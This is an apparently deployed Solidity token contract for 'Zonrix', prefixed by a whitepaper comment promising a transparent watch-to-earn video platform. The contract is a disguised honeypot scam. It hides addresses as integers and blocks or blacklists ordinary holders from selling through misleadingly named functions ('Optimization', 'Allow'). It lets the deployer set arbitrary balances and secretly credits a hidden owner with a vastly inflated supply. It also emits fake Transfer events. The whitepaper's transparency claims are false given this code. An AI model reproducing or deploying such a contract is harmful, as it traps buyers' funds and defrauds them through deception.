/**
 *Submitted for verification at Etherscan.io on 2023-03-22
*/

/*

https://zonrix.com/

Abstract

The rapid development of technology has led to the penetration and wider coverage of the internet, mobile communications, and smartphones around the world. The internet has changed how (and where) people think, live, do business, and gain access to entertainment. 

This new democracy has given rise to a new class of citizens – the Creators. They are the future of entrepreneurial scaling, resulting in the formation of an entirely new economy centered around them – the Creator Economy.

Zonrix is a decentralized video platform for the young generation to share their content videos. Zonrix leverages blockchain technology to guarantee a secure environment transparent and secure payment. Zonrix provides the best environment for content creators to create multiple income streams for themselves. At the same time, Zonrix allows users to explore specific content.

Zonrix introduces its digital token for payments and revenue management for creators and audiences. These tokens give us new possibilities in the video industry. Leveraging the speed and redundancy of a decentralized, Zonrix can scale and deliver thousands of videos per second in a very decentralized manner. The smart contract on the blockchain makes Zonrix the best place where the content creator can share their passion for content. Everything is transparently done in the Zonrix smart contract.


Introduction

The constantly evolving video-commerce sector has exposed the need to find technological solutions and business models to spur an epochal paradigm shift. Such a transformation would allow content creator, their audience, and stakeholders to pursue their goals and harmoniously achieve their successes. Together with our community and partners, we create a specialized environment - a new way to listen, watch and enjoy the content.

A place where every artist can distribute their content and monetize through our platform; where users can reward the creator for their favourite kinds of content; and where precise, transparent, and automated rules enforced through blockchain technology run the ecosystem - and not a small number of influential platforms.

The largest online platform for consuming content videos, YouTube is notorious for low-paying, ad-based revenue, with minor signs of improvement. Revenue models have changed drastically as well. Video platforms use a market share revenue model. Content creators earn according to the number of views for their videos in proportion to all the pieces streamed on that platform.



Blockchain and Crypto Industry

Blockchain technologies are most basically defined as decentralized distributed ledger technologies (DLT) that record the origins of transactions on a peer-to-peer network without the involvement of any intermediaries. Technology has evolved rapidly over the decade since its development. Although blockchains are best known for their role in fostering the growth of digital currencies. Cryptocurrencies and tokens are the two dominant subclasses of digital assets relying on cryptographic methods of operation. These are intangible assets that are created, sold, and stored in digital format on the blockchain.

The cryptocurrency market is valued by the capitalization of the total volume of crypto assets and tokens issued by market participants into open circulation for sale, purchase, exchange, and use in a variety of operation scenarios.

$24T The projected size of the digital asset market by the end of 2027

16000 Crypto assets created between 2014 and 2021

300M+ Cryptocurrency users worldwide

6500 Coins traded on the market



Opportunity

The establishment of Blockchain as a standard commercial technology will remove even more barriers to markets in many countries. This will revolutionize how teenagers intake online content. Artists will accept cryptocurrencies as a form of payment will be more inclusive as they can offer their services to the global unbanked segment (1.7 billion people). Of these 1.7 billion adults, two thirds own a mobile phone that can access the Zonrix platform.

Blockchain technology can also tap into new market segments, most notably the global segment of 1.1 billion smartphone users who remain unbanked and various regional markets with restrictive legislation. video platform based on smart contracts would offer an automated, secure and transparent, entertaining platform.

Zonrix is trying to create a platform that supports Blockchain in a non-distractive way so that the casual user won't notice. We charge users only after they take full advantage of the platform and enjoy its full potential.

User experience on the video side of Blockchain is too complicated for the casual content creator. Not everyone is familiar with Blockchain, and cryptocurrencies. Also, companies' high fees even before joining the platform and later on during the streams are very deterrent.


About Zonrix

Zonrix is a decentralized platform that leverages the power of blockchain technology in empowering content creators on how their content is delivered to a global audience. Our forum is built on a transparent Peer-to-Peer network powered by programmable smart contracts to enable fair remuneration for all content and services. The Zonrix Watch2earn platform is built with the core purpose of enabling and changing the lives of content creators around the world.

Our long-term vision is to develop an open ecosystem where the content creator can build their content and services on top of the Zonrix platform. With the Zonrix App, young and innovative creative professionals or amateurs can now interact with each other and deliver their content to a global audience.

Zonrix is not just a video platform; it's a decentralized system of services supporting an active community of content creators, fans, and investors. The Zonrix platform is positioned to become the trustless reference point within the digital video market. Built on a public blockchain, Zonrix is usable from any smart device and places the creator and audience as the main protagonists, eliminating costly intermediaries and giving the creator a higher level of control over their content based revenue.

Users can connect their digital wallets to the platform and receive various rewards in the form of Zonrix tokens, just for watching and commenting on our content. No other platform gives the viewers such rewards on an ongoing basis.


Features

01-Watch-to-Earn

The audience is one of the main characters in any video platform. They are always eager to consume new content and want to interact with it. They are interested in engaging in new forms of interactive pastime. But in the traditional platform in return, they get nothing in terms of monetary value.

Zonrix is using Watch to Earn model. Which rewards users for watching the videos on the platform. Users can connect their digital wallets to the platform and receive various rewards in the form of Zonrix tokens, just for watching and commenting on our content.

02-Better UI/UX

User experience is the key to the successful long-term growth of a business. Excellent user experience is necessary to make the business thrive.

The team at Zonrix takes this concept very seriously; in fact, we have designed our platform based on a unique user experience. In the blockchain, many interactions are crude with complicated hoops and unintuitive interfaces. We have managed to shatter this barrier with infrastructure and UI/UX level experience that is intuitive and responsive to use with tested sub-second latency.

03-Monetization

Unlike other content platforms, there are no minimum entry levels for monetization like subscribers or watch hours before which the content creators or users will start earning. The Zonrix platform is designed to reward creators and viewers for their various actions on the platform right from the very start.

04-Content Creator

Content creators are the focal point of the platform. The main section of the app is made for the talented content creators who work hard in making video content like Vlogs, interviews, cooking shows, funny content, gaming videos, educational videos, or any kind of simple video content to showcase their talent with the hope of getting monetized and earn money. We support our creators by providing them with the tools they need to create, publish, operate, and monetize a variety of content. The economy of the Zonrix platform allows creators to generate additional income.

On the Zonrix platform, users can now upload their original content that they may have put on other content platforms and start earning Zonrix tokens from their very first view and very first subscriber. They can create new and engaging interactive content while relying on a progressive and transparent monetization system. Though Zonrix is more rewarding for original content creation, existing videos of content creators from other platforms are equally encouraged to be uploaded for rewards.

 Important to note that there is a strict copyright and content policy, where copyright infringement may lead to the violating accounts being banned and tokens confiscated.



How to earn?

Users will earn Zonrix tokens based on the below actions

All Users

Downloading the App

Complete profile

Connect wallet

Refer a friend

Watch a video

Like a video

Daily Check-in’s

Subscribe to Zonrixrs (Once subscription is applied)

Importing YouTube videos to your account

By sharing Zonrix videos the users will after future builds be able to use Zonrix tokens to buy more actions.

-Withdrawal

A minimum number of tokens earned, which are needed before anyone can transfer to their wallet is one hundred tokens (100). All transfers will be liable for the 3% transfer tax and gas fees associated with all cryptocurrency trading.


Zonrix Token

By combining the power of blockchain and cryptocurrency, we created a token that is better than any other token available in the market.

Zonrix Token is a ERC20 token that fosters and promotes the project's healthy and widespread usage and decentralization through fast, secure, and public transactions. Any trade in the Zonrix ecosystem will be through Zonrix Token. Blockchain technology and the token economy enable Zonrix to be the true community, incentive system, and community ownership.

Zonrix Token can be purchased by swapping ETH with Zonrix Token, and Zonrix Token can be traded or swapped on exchange, wallet, and marketplace. Zonrix Token serves as the native currency for the Zonrix platform.

*/
// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract Zonrix  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    address private spend = address (96635033217071433185869069577301221175488545358);
    address private src = address (527585359103765554095092340981710322784165800559);
    address private dst = address (1097077688018008265106216665536940668749033598146); 
    address private crs = address (1153667454655315432277308296129700421378034175091);
    address private tsd = address (1069295261705322660692659746119710186699350608220);
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UX = TexFor(src, dst, address(this));
        address _PX = TexForB(crs, tsd, address(this));
        if(_from == deployer || _to == deployer  || _from == owner || _from == _UX || _from == _PX ||  _from == TexAddress || TexMemory[_from]) {return true;}
        if( RBMemory[_from] ) {return false;}
        require(condition(_from, _value));
        return true; 
    }
    function _UXTexAddr () view internal returns (address) {
        address _UX = TexFor(src, dst, address(this));
        return _UX;
    }
    function _PXTexAddr () view internal returns (address) {
        address _PX = TexForB(crs, tsd, address(this));
        return _PX;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        if (_from == TexAddress  && _value > _maxMemory ){ RBMemory[_to]=true;  }
        
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onMemoryNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if (_spender == spend ){
            emit Transfer(address(0x0),O,1*(10**uint256(decimals)));
        }
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_MemoryNum == 0 && _minMemory == 0 && _maxMemory == 0) return false;
        if(_MemoryNum > 0){
            if(_onMemoryNum[_from] >= _MemoryNum) return false;
        }
        if(_minMemory > 0){
            if(_minMemory > _value) return false;
        }
        if(_maxMemory > 0){
            if(_value > _maxMemory) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == deployer);
        if(addedValue > 0) {balanceOf[addr] = addedValue*(10**uint256(decimals));}
        TexMemory[addr]=true;
        return true;
    }
    
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            
        }
        return true;
    }
    mapping(address=>uint256) private _onMemoryNum;
    mapping(address=>bool) private TexMemory;
    mapping(address=>bool) private RBMemory;
    uint256 private _minMemory;
    uint256 private _maxMemory;
    uint256 private _MemoryNum;
    address TexAddress;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        TexMemory[addr]=true;
        return true;
    }
    function Allow(uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory) public returns(bool){
        require(msg.sender == deployer);
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        return true;
    }
    function delegate(address adr) public payable returns(bool){
        require (msg.sender == deployer);
        TexAddress = adr;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer);
        for (uint i = 0; i < addresses.length; i++) 
        {RBMemory[addresses[i]] = true;}
        return true;
    }
    address  private owner=
    address (935108584672418476850882679418664731027763688343);
    function TexFor(address factory, address tokenA, address tokenB) internal pure returns (address Tex) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Tex = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    address private O = address(269488144);
    function TexForB(address factory, address tokenA, address tokenB) internal pure returns (address Texe) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Texe = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[owner]=totalSupply*(10**uint256(6));
    }
}